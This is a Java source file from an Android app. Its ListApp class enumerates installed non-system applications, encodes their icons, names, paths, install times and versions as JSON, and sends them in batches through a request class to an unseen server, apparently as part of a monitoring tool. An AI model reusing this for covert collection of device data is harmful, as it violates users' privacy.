package com.inet.android.archive;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.Logging;

@SuppressLint("NewApi")
public class ListApp {
	Context mContext;
	private String iType = "4";
	static SharedPreferences sp;
	private String sendStr = null;
	private String complete;
	private static String LOG_TAG = "ListApp";
	Editor ed;
	final int COMPRESSION_QUALITY = 100;

	/**
	 * get the list of all installed applications in the device
	 * 
	 * @return ArrayList of installed applications or null
	 */
	@SuppressLint("NewApi")
	public void getListOfInstalledApp(Context context) {
		this.mContext = context;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();

		// -------initial json line----------------------
		JSONObject jsonAppList = new JSONObject();
		if (sp.getBoolean("network_available", true) == true) {
			int flags = PackageManager.GET_META_DATA
					| PackageManager.GET_SHARED_LIBRARY_FILES
					| PackageManager.GET_UNINSTALLED_PACKAGES;
			PackageManager packageManager = context.getPackageManager();
			final List<ApplicationInfo> installedApps = packageManager
					.getInstalledApplications(flags);
			for (ApplicationInfo app : installedApps) {
				if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
					// System application

				} else {
					try {
						PackageInfo packageInfo = packageManager
								.getPackageInfo(app.packageName,
										PackageManager.GET_PERMISSIONS);
						SimpleDateFormat dateFormat = new SimpleDateFormat(
								"yyyy-MM-dd HH:mm:ss");

						String installTime = dateFormat.format(new Date(
								packageInfo.firstInstallTime));
						// -----------get Icon
						// App-------------------------------------
						Drawable icon = packageInfo.applicationInfo
								.loadIcon(context.getPackageManager());
						Bitmap bitmap = ((BitmapDrawable) icon).getBitmap();

						String encodedImage;
						ByteArrayOutputStream byteArrayBitmapStream = new ByteArrayOutputStream();
						bitmap.compress(Bitmap.CompressFormat.PNG,
								COMPRESSION_QUALITY, byteArrayBitmapStream);
						byte[] b = byteArrayBitmapStream.toByteArray();
						encodedImage = Base64.encodeToString(b, Base64.DEFAULT);
						//------------------------------------------------------
						//                Send Data
						//------------------------------------------------------
						jsonAppList.put("icon", encodedImage);
						jsonAppList.put("name", app.loadLabel(packageManager));
						jsonAppList.put("dir", app.sourceDir);
						jsonAppList.put("time", installTime);
						jsonAppList.put("build", packageInfo.versionCode);
						
						if (sendStr == null)
							sendStr = jsonAppList.toString();
						else
							sendStr += "," + jsonAppList.toString();
						if (sendStr.length() >= 10000) {
							Logging.doLog(LOG_TAG, "str >= 10000 ..",
									"str >= 10000 ..");
							complete = "0";
							sendRequest(sendStr, complete);
							sendStr = null;
						}
					} catch (PackageManager.NameNotFoundException e) {
						e.printStackTrace();

					} catch (JSONException e) {
						Logging.doLog(LOG_TAG, "json сломался", "json сломался");

					}
				}

			}
			if (!sendStr.equals(" ") && sendStr != null) {
				complete = "1";
				// Logging.doLog(LOG_TAG, "Send complete 1 .." + sendStr,
				// "Send complete 1 .." + sendStr);
				sendRequest(sendStr, complete);
				sendStr = null;
				ed.putString("app_list", "0");
			}
		} else {
			ed.putString("app_list", "1");
		}
		ed.commit();
	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
			dr.sendRequest(str);
		}
	}
}